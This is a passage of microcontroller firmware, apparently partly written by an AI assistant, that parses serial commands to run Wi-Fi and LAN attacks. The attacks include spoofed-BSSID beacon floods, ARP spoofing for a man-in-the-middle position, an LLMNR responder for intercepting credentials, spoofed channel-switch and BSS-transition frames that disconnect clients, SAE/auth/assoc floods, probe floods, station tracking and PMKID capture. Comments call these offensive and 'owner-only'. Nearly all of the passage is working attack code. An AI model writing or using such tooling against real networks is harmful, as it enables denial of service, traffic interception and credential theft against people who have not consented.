      }else if(apActive || CAP_ON() || hopping || hsg_phase != HSG_IDLE || atOwned() ||
               hv_phase != HV_IDLE || wids_on || et_phase != ET_IDLE){
        Serial.println("CHANINTERF:busy"); Serial1.println("CHANINTERF:busy");
      }else{
        static const uint8_t ci_ch[] = {1, 6, 11, 36, 40, 44, 48};
        uint8_t src[6] = {0x00, 0xE0, 0x4C, 0x0C, 0x1F, 0x00};
        uint32_t endms = millis() + (uint32_t)secs * 1000u;
        Serial.print("CHANINTERF:start ssid="); Serial.println(ssid);
        Serial1.print("CHANINTERF:start ssid="); Serial1.println(ssid);
        while((int32_t)(millis() - endms) < 0){
          for(unsigned c = 0; c < sizeof(ci_ch); c++){
            if(is_dfs_channel(ci_ch[c])) continue;        // DFS: no TX
            wext_set_channel(WLAN0_NAME, ci_ch[c]);
            tx_beacon_raw(src, TX_BCAST, ssid.c_str(), 0x80, ci_ch[c]);
            delay(3);
          }
        }
        Serial.println("CHANINTERF:done"); Serial1.println("CHANINTERF:done");
      }
    }else if(readString.substring(0,4)=="BBH "){
      // OFFENSIVE (owner-only): Broadcast Black Hole — flood beacons SPOOFING the target BSSID with
      // varying garbage SSIDs on its channel, drowning the real AP in scan noise. Pinnable. Bounded.
      // Args: BBH <bssid-12hex> <chan> [secs]   (UNVERIFIED; owner validates LIVE)
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1 + 1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2 + 1) : -1;
      String hex = (s1 > 0) ? readString.substring(s1 + 1, s2 > 0 ? s2 : readString.length() - 1) : String("");
      int ch = (s2 > 0) ? readString.substring(s2 + 1, s3 > 0 ? s3 : readString.length() - 1).toInt() : 6;
      int secs = (s3 > 0) ? readString.substring(s3 + 1, readString.length() - 1).toInt() : 10;
      if(secs < 1 || secs > 30) secs = 10;  if(ch < 1 || ch > 165) ch = 6;
      uint8_t bssid[6]; bool ok = hex_to_mac(hex, bssid);
      if(!ok){
        Serial.println("ERROR: BBH needs <bssid-12hex> <chan> [secs]"); Serial1.println("ERROR: BBH needs <bssid-12hex> <chan> [secs]");
      }else if(apActive || CAP_ON() || hopping || hsg_phase != HSG_IDLE || atOwned() ||
               hv_phase != HV_IDLE || wids_on || et_phase != ET_IDLE){
        Serial.println("BBH:busy"); Serial1.println("BBH:busy");
      }else if(is_dfs_channel(ch)){
        Serial.println("BBH:DFS channel, TX refused"); Serial1.println("BBH:DFS channel, TX refused");
      }else{
        wext_set_channel(WLAN0_NAME, ch);
        uint32_t endms = millis() + (uint32_t)secs * 1000u, n = 0;
        Serial.println("BBH:start"); Serial1.println("BBH:start");
        while((int32_t)(millis() - endms) < 0){
          char ss[12]; snprintf(ss, sizeof(ss), "BBH%04lX", (unsigned long)(n & 0xFFFF));
          tx_beacon_raw(bssid, TX_BCAST, ss, 0x80, ch); n++;
          delay(1);
        }
        char m[32]; snprintf(m, sizeof(m), "BBH:done n=%lu", (unsigned long)n);
        Serial.println(m); Serial1.println(m);
      }
    }else if(readString.substring(0,8)=="HOSTSCAN"){
      // OFFENSIVE (owner-only, YOUR network): join <ssid>/<pass> as a station and TCP-connect-scan
      // <ip> for the given ports (default 22,80,443,445,8080); reports OPEN/closed. Single radio ->
      // refuses if a mode owns it; restores on exit. HOSTSCAN <ssid> <pass> <ip> [p1,p2,...]
      // UNVERIFIED by assistant (needs YOUR lab network; station-mode mode-switch untested here).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1 + 1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2 + 1) : -1;
      int s4 = (s3 > 0) ? readString.indexOf(' ', s3 + 1) : -1;
      String ssid = (s1 > 0) ? readString.substring(s1 + 1, s2 > 0 ? s2 : readString.length() - 1) : String("");
      String pass = (s2 > 0) ? readString.substring(s2 + 1, s3 > 0 ? s3 : readString.length() - 1) : String("");
      String ips  = (s3 > 0) ? readString.substring(s3 + 1, s4 > 0 ? s4 : readString.length() - 1) : String("");
      String pcsv = (s4 > 0) ? readString.substring(s4 + 1, readString.length() - 1) : String("22,80,443,445,8080");
      if(ssid.length() == 0 || pass.length() == 0 || ips.length() == 0){
        Serial.println("ERROR: HOSTSCAN <ssid> <pass> <ip> [ports]"); Serial1.println("ERROR: HOSTSCAN <ssid> <pass> <ip> [ports]");
      }else if(apActive || CAP_ON() || hopping || hsg_phase != HSG_IDLE || atOwned() ||
               hv_phase != HV_IDLE || wids_on || et_phase != ET_IDLE){
        Serial.println("HOSTSCAN:busy"); Serial1.println("HOSTSCAN:busy");
      }else{
        int o[4] = {0, 0, 0, 0};
        { int f = 0, k = 0; while(k < 4 && f <= (int)ips.length()){ int d = ips.indexOf('.', f);
            o[k++] = ips.substring(f, d < 0 ? ips.length() : d).toInt(); if(d < 0) break; f = d + 1; } }
        IPAddress tip(o[0], o[1], o[2], o[3]);
        Serial.println("HOSTSCAN:joining"); Serial1.println("HOSTSCAN:joining");
        WiFi.begin((char*)ssid.c_str(), (char*)pass.c_str());
        int tries = 0; while(WiFi.status() != WL_CONNECTED && ++tries < 30) delay(500);
        if(WiFi.status() != WL_CONNECTED){
          Serial.println("HOSTSCAN:join-failed"); Serial1.println("HOSTSCAN:join-failed");
        }else{
          IPAddress lip = WiFi.localIP();
          char ml[48]; snprintf(ml, sizeof(ml), "HOSTSCAN:joined ip=%d.%d.%d.%d", lip[0], lip[1], lip[2], lip[3]);
          Serial.println(ml); Serial1.println(ml);
          int from = 0;
          while(from < (int)pcsv.length()){
            int comma = pcsv.indexOf(',', from);
            int port = pcsv.substring(from, comma < 0 ? pcsv.length() : comma).toInt();
            if(port > 0 && port < 65536){
              WiFiClient c;
              bool open = c.connect(tip, (uint16_t)port);
              char m[52]; snprintf(m, sizeof(m), "HOSTSCAN:%s:%d %s", ips.c_str(), port, open ? "OPEN" : "closed");
              Serial.println(m); Serial1.println(m);
              if(open) c.stop();
            }
            if(comma < 0) break;
            from = comma + 1;
          }
          Serial.println("HOSTSCAN:done"); Serial1.println("HOSTSCAN:done");
          WiFi.disconnect();
        }
      }
    }else if(readString.substring(0,8)=="ARPSPOOF"){
      // OFFENSIVE (owner-only, YOUR lab): join <ssid>/<pass>, then bidirectional gratuitous-ARP so
      // <victim> thinks <gateway> is us and vice-versa (MITM setup). No forwarding = black-hole DoS
      // unless the owner adds routing. ARPSPOOF <ssid> <pass> <victim-ip> <gateway-ip> [secs].
      // UNVERIFIED by assistant (raw-frame send needs validation on YOUR network).
      int s1=readString.indexOf(' '), s2=(s1>0)?readString.indexOf(' ',s1+1):-1;
      int s3=(s2>0)?readString.indexOf(' ',s2+1):-1, s4=(s3>0)?readString.indexOf(' ',s3+1):-1;
      int s5=(s4>0)?readString.indexOf(' ',s4+1):-1;
      String ssid=(s1>0)?readString.substring(s1+1,s2>0?s2:readString.length()-1):String("");
      String pass=(s2>0)?readString.substring(s2+1,s3>0?s3:readString.length()-1):String("");
      String vip =(s3>0)?readString.substring(s3+1,s4>0?s4:readString.length()-1):String("");
      String gip =(s4>0)?readString.substring(s4+1,s5>0?s5:readString.length()-1):String("");
      int secs=(s5>0)?readString.substring(s5+1,readString.length()-1).toInt():15;
      if(secs<1||secs>60) secs=15;
      if(ssid.length()==0||pass.length()==0||vip.length()==0||gip.length()==0){
        Serial.println("ERROR: ARPSPOOF <ssid> <pass> <victim-ip> <gateway-ip> [secs]");
        Serial1.println("ERROR: ARPSPOOF <ssid> <pass> <victim-ip> <gateway-ip> [secs]");
      }else if(apActive||CAP_ON()||hopping||hsg_phase!=HSG_IDLE||atOwned()||hv_phase!=HV_IDLE||wids_on||et_phase!=ET_IDLE){
        Serial.println("ARPSPOOF:busy"); Serial1.println("ARPSPOOF:busy");
      }else{
        uint8_t vi[4]={0,0,0,0}, gi[4]={0,0,0,0};
        { int f=0,k=0; while(k<4&&f<=(int)vip.length()){int d=vip.indexOf('.',f); vi[k++]=(uint8_t)vip.substring(f,d<0?vip.length():d).toInt(); if(d<0)break; f=d+1;} }
        { int f=0,k=0; while(k<4&&f<=(int)gip.length()){int d=gip.indexOf('.',f); gi[k++]=(uint8_t)gip.substring(f,d<0?gip.length():d).toInt(); if(d<0)break; f=d+1;} }
        Serial.println("ARPSPOOF:joining"); Serial1.println("ARPSPOOF:joining");
        WiFi.begin((char*)ssid.c_str(), (char*)pass.c_str());
        int tries=0; while(WiFi.status()!=WL_CONNECTED && ++tries<30) delay(500);
        if(WiFi.status()!=WL_CONNECTED){
          Serial.println("ARPSPOOF:join-failed"); Serial1.println("ARPSPOOF:join-failed");
        }else{
          Serial.println("ARPSPOOF:spoofing"); Serial1.println("ARPSPOOF:spoofing");
          uint32_t endms=millis()+(uint32_t)secs*1000u;
          while((int32_t)(millis()-endms)<0){
            arp_spoof_once(gi, vi);   // tell victim: gateway is-at us
            arp_spoof_once(vi, gi);   // tell gateway: victim is-at us
            delay(1500);
          }
          Serial.println("ARPSPOOF:done"); Serial1.println("ARPSPOOF:done");
          WiFi.disconnect();
        }
      }
    }else if(readString.substring(0,9)=="RESPONDER"){
      // OFFENSIVE (owner-only, YOUR lab): join <ssid>/<pass> and answer LLMNR (UDP 5355) queries with
      // OUR IP for <secs>, so victims resolve names to us (credential-interception setup; capture the
      // auth on a listener you run). RESPONDER <ssid> <pass> [secs]. UNVERIFIED by assistant.
      int s1=readString.indexOf(' '), s2=(s1>0)?readString.indexOf(' ',s1+1):-1, s3=(s2>0)?readString.indexOf(' ',s2+1):-1;
      String ssid=(s1>0)?readString.substring(s1+1,s2>0?s2:readString.length()-1):String("");
      String pass=(s2>0)?readString.substring(s2+1,s3>0?s3:readString.length()-1):String("");
      int secs=(s3>0)?readString.substring(s3+1,readString.length()-1).toInt():30;
      if(secs<1||secs>120) secs=30;
      if(ssid.length()==0||pass.length()==0){
        Serial.println("ERROR: RESPONDER <ssid> <pass> [secs]");
        Serial1.println("ERROR: RESPONDER <ssid> <pass> [secs]");
      }else if(apActive||CAP_ON()||hopping||hsg_phase!=HSG_IDLE||atOwned()||hv_phase!=HV_IDLE||wids_on||et_phase!=ET_IDLE){
        Serial.println("RESPONDER:busy"); Serial1.println("RESPONDER:busy");
      }else{
        Serial.println("RESPONDER:joining"); Serial1.println("RESPONDER:joining");
        WiFi.begin((char*)ssid.c_str(), (char*)pass.c_str());
        int tries=0; while(WiFi.status()!=WL_CONNECTED && ++tries<30) delay(500);
        if(WiFi.status()!=WL_CONNECTED){
          Serial.println("RESPONDER:join-failed"); Serial1.println("RESPONDER:join-failed");
        }else if(!responder_start()){
          Serial.println("RESPONDER:bind-failed"); Serial1.println("RESPONDER:bind-failed"); WiFi.disconnect();
        }else{
          Serial.println("RESPONDER:listening (LLMNR)"); Serial1.println("RESPONDER:listening");
          uint32_t endms=millis()+(uint32_t)secs*1000u;
          while((int32_t)(millis()-endms)<0) delay(100);   // lwIP callback answers queries
          responder_stop();
          Serial.println("RESPONDER:done"); Serial1.println("RESPONDER:done");
          WiFi.disconnect();
        }
      }
    }else if(readString.substring(0,7)=="BTMSTAS"){
      // B3b: unicast BTM request to every station from the last STASCAN. Same argument as
      // CSASTAS: a real AP steers clients with unicast management action frames, broadcast ones
      // are widely ignored.
      // Args: BTMSTAS <bssid-12hex> <ap-chan> <new-chan> [frames]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      String hex = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int apch = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 6;
      int newch = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 1;
      uint8_t bssid[6];
      bool ok = (hex.length() == 12);
      for(int i = 0; ok && i < 6; i++) {
        int hi = hexnib(hex.charAt(i * 2));
        int lo = hexnib(hex.charAt(i * 2 + 1));
        if(hi < 0 || lo < 0) { ok = false; break; }
        bssid[i] = (uint8_t)((hi << 4) | lo);
      }
      if(!ok) {
        Serial.println("ERROR: BTMSTAS needs a 12-hex bssid"); Serial1.println("ERROR: BTMSTAS needs a 12-hex bssid");
      }else if(STA_LOAD() == 0) {
        Serial.println("ERROR: no stations known - run STASCAN first"); Serial1.println("ERROR: no stations known - run STASCAN first");
      }else{
        if(!is_valid_tx_channel(apch)) apch = 6;
        if(!is_valid_tx_channel(newch)) newch = 1;
        if(apActive) destroyAP();
        wext_set_channel(WLAN0_NAME, apch);
        uint8_t sent = 0;
        uint8_t sn0 = STA_LOAD();
        for(uint8_t i = 0; i < sn0 && i < STA_MAX; i++) {
          for(int x = 0; x < 3; x++) btm_send_frame(bssid, (uint8_t)newch, sta_list[i].mac);
          sent++;
        }
        String r = String("BTMSTAS:") + String((unsigned)sent) + " ch=" + String(newch);
        Serial.println(r); Serial1.println(r);
      }
    }else if(readString.substring(0,3)=="BTM" && readString.charAt(3)==' '){
      // B3: BTM <bssid-12hex> <ap-chan> <new-chan> [frames]
      // Spoofs BSS transition requests from the target AP; a client that supports 802.11v tries
      // to move to the phantom candidate and leaves the AP without a single deauth frame.
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int s4 = (s3 > 0) ? readString.indexOf(' ', s3+1) : -1;
      String hex = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int apch = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 6;
      int newch = (s3 > 0) ? readString.substring(s3+1, s4>0?s4:readString.length()-1).toInt() : 1;
      int frames = (s4 > 0) ? readString.substring(s4+1, readString.length()-1).toInt() : 12;
      uint8_t bssid[6];
      bool ok = (hex.length() == 12);
      for(int i = 0; ok && i < 6; i++) {
        int hi = hexnib(hex.charAt(i * 2));
        int lo = hexnib(hex.charAt(i * 2 + 1));
        if(hi < 0 || lo < 0) { ok = false; break; }
        bssid[i] = (uint8_t)((hi << 4) | lo);
      }
      if(!ok) {
        Serial.println("ERROR: BTM needs a 12-hex bssid"); Serial1.println("ERROR: BTM needs a 12-hex bssid");
      }else{
        if(apch < 1 || apch > 165) apch = 6;
        if(newch < 1 || newch > 165) newch = 1;
        if(frames < 1 || frames > 60) frames = 12;
        if(apActive) destroyAP();
        wext_set_channel(WLAN0_NAME, apch);
        for(int i = 0; i < frames; i++) btm_send_frame(bssid, (uint8_t)newch, TX_BCAST);
        String r = String("BTM:") + String((unsigned)frames) + " ch=" + String(newch);
        Serial.println(r); Serial1.println(r);
      }
    }else if(readString.substring(0,8)=="SAEFLOOD"){
      // B4: SAEFLOOD <bssid-12hex> <chan> [count]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      String hex = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int apch = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 6;
      int count = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 64;
      uint8_t bssid[6];
      bool ok = (hex.length() == 12);
      for(int i = 0; ok && i < 6; i++) {
        int hi = hexnib(hex.charAt(i * 2));
        int lo = hexnib(hex.charAt(i * 2 + 1));
        if(hi < 0 || lo < 0) { ok = false; break; }
        bssid[i] = (uint8_t)((hi << 4) | lo);
      }
      if(!ok) {
        Serial.println("ERROR: SAEFLOOD needs a 12-hex bssid"); Serial1.println("ERROR: SAEFLOOD needs a 12-hex bssid");
      }else{
        if(apch < 1 || apch > 165) apch = 6;
        if(count < 1 || count > 500) count = 64;
        if(!tx_raw_chan_ok(apch, "SAEFLOOD")) {
          // refused above; nothing else to do
        }else{
        if(apActive) destroyAP();
        for(int i = 0; i < count; i++) {
          flood_mac_rand();                 // a different client per commit: no state to reuse
          wext_set_channel(WLAN0_NAME, apch);   // tune immediately before every TX: the SDK hangs
          sae_send_commit(bssid, flood_sta);    // inside the TX path if the radio is not tuned
          if((i & 15) == 15) delay(2);      // let the WiFi task breathe every 16 frames
        }
        }
        String r = String("SAEFLOOD:") + String((unsigned)count) + " ch=" + String(apch);
        Serial.println(r); Serial1.println(r);
      }
    }else if(readString.substring(0,5)=="AUTHF" || readString.substring(0,5)=="ASSOC"){
      // B5: AUTHFLOOD <bssid-12hex> <chan> [count]
      //     ASSOCFLOOD <bssid-12hex> <chan> [count]   (auth + assoc + sleep per random MAC)
      bool with_assoc = (readString.substring(0,5) == "ASSOC");
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      String hex = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int apch = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 6;
      int count = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 64;
      uint8_t bssid[6];
      bool ok = (hex.length() == 12);
      for(int i = 0; ok && i < 6; i++) {
        int hi = hexnib(hex.charAt(i * 2));
        int lo = hexnib(hex.charAt(i * 2 + 1));
        if(hi < 0 || lo < 0) { ok = false; break; }
        bssid[i] = (uint8_t)((hi << 4) | lo);
      }
      if(!ok) {
        String e = String("ERROR: ") + (with_assoc ? "ASSOCFLOOD" : "AUTHFLOOD") + " needs a 12-hex bssid";
        Serial.println(e); Serial1.println(e);
      }else{
        if(apch < 1 || apch > 165) apch = 6;
        if(count < 1 || count > 500) count = 64;
        if(!tx_raw_chan_ok(apch, with_assoc ? "ASSOCFLOOD" : "AUTHFLOOD")) {
        }else{
        if(apActive) destroyAP();
        String ssid = with_assoc ? flood_ssid_for(bssid) : String("");
        for(int i = 0; i < count; i++) {
          flood_mac_rand();
          wext_set_channel(WLAN0_NAME, apch);
          flood_tx_auth(bssid, flood_sta);
          if(with_assoc) {
            flood_tx_assoc(bssid, flood_sta, ssid.c_str());
            flood_tx_sleep(bssid, flood_sta);
          }
          if((i & 15) == 15) delay(2);   // let the WiFi task breathe every 16 frames
        }
        }
        String r = (with_assoc ? "ASSOCFLOOD:" : "AUTHFLOOD:") + String((unsigned)count) +
                   " ch=" + String(apch) + (with_assoc ? (" ssid=" + ssid) : "");
        Serial.println(r); Serial1.println(r);
      }
    }else if(readString.substring(0,7)=="CSASTAS"){
      // B2b: unicast CSA to every station we know about (from the last STASCAN). That is what a
      // real AP does and what clients actually obey - broadcast CSA action frames are widely
      // ignored (measured: broadcast dropped some clients, Apple/ax ignored it entirely).
      // Args: CSASTAS <bssid-12hex> <ap-chan> <new-chan> [frames]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      String hex = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int apch = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 6;
      int newch = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 1;
      uint8_t bssid[6];
      bool ok = (hex.length() == 12);
      for(int i = 0; ok && i < 6; i++) {
        int hi = hexnib(hex.charAt(i * 2));
        int lo = hexnib(hex.charAt(i * 2 + 1));
        if(hi < 0 || lo < 0) { ok = false; break; }
        bssid[i] = (uint8_t)((hi << 4) | lo);
      }
      if(!ok) {
        Serial.println("ERROR: CSASTAS needs a 12-hex bssid"); Serial1.println("ERROR: CSASTAS needs a 12-hex bssid");
      }else if(STA_LOAD() == 0) {
        Serial.println("ERROR: no stations known - run STASCAN first"); Serial1.println("ERROR: no stations known - run STASCAN first");
      }else{
        if(!is_valid_tx_channel(apch)) apch = 6;
        if(!is_valid_tx_channel(newch)) newch = 1;
        if(apActive) destroyAP();
        wext_set_channel(WLAN0_NAME, apch);
        uint8_t sent = 0;
        uint8_t sn0 = STA_LOAD();
        for(uint8_t i = 0; i < sn0 && i < STA_MAX; i++) {
          for(int x = 0; x < 3; x++) csa_send_frame(bssid, (uint8_t)newch, 3, 1, sta_list[i].mac);
          sent++;
        }
        String r = String("CSASTAS:") + String((unsigned)sent) + " ch=" + String(newch);
        Serial.println(r); Serial1.println(r);
      }
    }else if(readString.substring(0,3)=="CSA" && readString.charAt(3)==' '){
      // B2: CSA <bssid-12hex> <ap-chan> <new-chan> [frames]
      // Spoofs channel-switch announcements from the target AP; its clients hop channels (or drop)
      // with no deauth at all. Unprotected-CSA-only: PMF/WPA3 clients ignore it.
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int s4 = (s3 > 0) ? readString.indexOf(' ', s3+1) : -1;
      String hex = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int apch = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 6;
      int newch = (s3 > 0) ? readString.substring(s3+1, s4>0?s4:readString.length()-1).toInt() : 1;
      int frames = (s4 > 0) ? readString.substring(s4+1, readString.length()-1).toInt() : 12;
      uint8_t bssid[6];
      bool ok = (hex.length() == 12);
      for(int i = 0; ok && i < 6; i++) {
        int hi = hexnib(hex.charAt(i * 2));
        int lo = hexnib(hex.charAt(i * 2 + 1));
        if(hi < 0 || lo < 0) { ok = false; break; }
        bssid[i] = (uint8_t)((hi << 4) | lo);
      }
      if(!ok) {
        Serial.println("ERROR: CSA needs a 12-hex bssid"); Serial1.println("ERROR: CSA needs a 12-hex bssid");
      }else{
        if(apch < 1 || apch > 165) apch = 6;
        if(newch < 1 || newch > 165) newch = 1;
        if(frames < 1 || frames > 60) frames = 12;
        if(apActive) destroyAP();                  // no softAP fighting us on another channel
        wext_set_channel(WLAN0_NAME, apch);        // we must transmit on the target AP's channel
        for(int i = 0; i < frames; i++) csa_send_frame(bssid, (uint8_t)newch, 3, 1, TX_BCAST);
        String r = String("CSA:") + String((unsigned)frames) + " ch=" + String(newch);
        Serial.println(r); Serial1.println(r);
      }
    }else if(readString.substring(0,7)=="APCLONE"){
      // B6: clone <ssid> across [cnt] random locally-administered BSSIDs on [chan] (AP clone spam).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      String ssid = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int cnt = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 8;
      int chan = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 6;
      if(cnt < 1 || cnt > 40) cnt = 8;
      if(ssid.length() == 0){
        Serial.println("ERROR: APCLONE needs <ssid> [count] [chan]"); Serial1.println("ERROR: APCLONE needs <ssid> [count] [chan]");
      }else{
        if(apActive) destroyAP();
        for(int i=0;i<cnt;i++){
          uint8_t src[6];
          for(int k=0;k<6;k++) src[k] = (uint8_t)random(0x00, 0xFF);
          src[0] = (src[0] & 0xFC) | 0x02;      // locally administered, unicast
          for(int x=0;x<3;x++) tx_beacon_raw(src, TX_BCAST, ssid.c_str(), 0x80, chan);
        }
        String r = "APCLONE:" + String((unsigned)cnt) + "|" + ssid;
        Serial.println(r); Serial1.println(r);
      }
    }else if(readString.substring(0,10)=="PROBEFLOOD"){
      // B7: emit probe requests for <ssid|*> on <chan> from [cnt] random MACs.
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      String ssid = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("*");
      int cnt = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 24;
      if(ch < 1 || ch > 165) ch = 6;
      if(cnt < 1 || cnt > 200) cnt = 24;
      const char* s = (ssid == "*") ? NULL : ssid.c_str();
      if(apActive) destroyAP();
      wext_set_channel(WLAN0_NAME, ch);
      for(int i=0;i<cnt;i++){
        uint8_t src[6];
        for(int k=0;k<6;k++) src[k] = (uint8_t)random(0x00, 0xFF);
        src[0] = (src[0] & 0xFC) | 0x02;
        tx_probe_req(src, s);
      }
      String r = "PROBEFLOOD:" + String((unsigned)cnt);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,7)=="PMFSCAN"){
      // P2: classify nearby APs (PMF-required / SAE / #AKMs) from the beacon RSN IE.
      // Args: PMFSCAN <chan> [secs]  (default 5s, max 60s).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 5;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 5;
      if(apActive) destroyAP();   // monitor scan needs the softAP torn down
      wifi_set_promisc(0, NULL, 0);   // quiesce a previous collector before resetting
      PMFN_SET(0);
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_pmf_cb, 0);
      for(int i=0;i<secs;i++) delay(1000);
      wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
      pmf_stream(ch);
    }else if(readString.substring(0,5)=="TRACK"){
      // A2: TRACK <chan> [secs] - device timeline for a channel (see promisc_cli_cb).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 30;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 2 || secs > 120) secs = 30;
      if(apActive) destroyAP();
      wifi_set_promisc(0, NULL, 0);
      CLIN_SET(0);
      cli_on = true;
      cli_base = millis();
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_cli_cb, 0);
      for(int i=0;i<secs;i++) delay(1000);
      wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
      cli_on = false;
      cli_stream(ch);
    }else if(readString.substring(0,7)=="STASCAN"){
      // P4: list stations seen for a BSSID. Args: STASCAN <chan> [secs] [bssid-12hex]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      String bssid_hex = "";
      int secs = 5;
      if (s2 > 0) {
        String a2s = readString.substring(s2+1, s3>0?s3:readString.length()-1);
        if (a2s.length() == 12) {   // 12 hex chars -> BSSID filter, secs becomes 3rd arg
          bssid_hex = a2s;
          secs = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 5;
        } else {
          secs = a2s.toInt();
        }
      }
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 5;
      if(apActive) destroyAP();   // monitor scan needs the softAP torn down
      STA_STORE(0);
      sta_filter_on = (bssid_hex.length() == 12);
      for(int i=0; sta_filter_on && i<6; i++)
        sta_filter[i] = (uint8_t)strtoul(bssid_hex.substring(i*2, i*2+2).c_str(), NULL, 16);
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_sta_cb, 0);
      for(int i=0;i<secs;i++) delay(1000);
      wifi_set_promisc(0, NULL, 0);
      sta_stream(ch);
    }else if(readString.substring(0,11)=="PMKIDCLIENT"){
      // P6 clientless: raw-assoc to make the AP replay M1, capture the PMKID.
      // Args: PMKIDCLIENT <chan> <bssid-12hex> <ssid...>
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      String bhex = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("");
      String ssid = (s3 > 0) ? readString.substring(s3+1, readString.length()-1) : String("");
      if(!is_valid_tx_channel(ch)) ch = 6;   // it transmits auth/assoc, so DFS is not allowed
      uint8_t bssid[6]; bool ok = hex_to_mac(bhex, bssid);
      if(!ok || ssid.length() == 0){
        Serial.println("ERR:PMKIDCLIENT:args"); Serial1.println("ERR:PMKIDCLIENT:args");
      }else{
        if(apActive) destroyAP();   // monitor capture needs the softAP torn down
        wifi_set_promisc(0, NULL, 0);
        hsg_phase = HSG_IDLE;       // this replaces the grab's callback: cancel its FSM too
        HSCAP_SET(false);           // ...and its capture flag, or a later sniffer would append
        PMKN_SET(0);
        cl_eapol = 0;
        memcpy(hsg_bssid, bssid, 6); hsg_target_set = true;   // bind PMKID capture to this AP
        char macstr[20] = {0};
        wifi_get_mac_address(macstr);
        char ssidbuf[33]; ssid.toCharArray(ssidbuf, sizeof(ssidbuf));
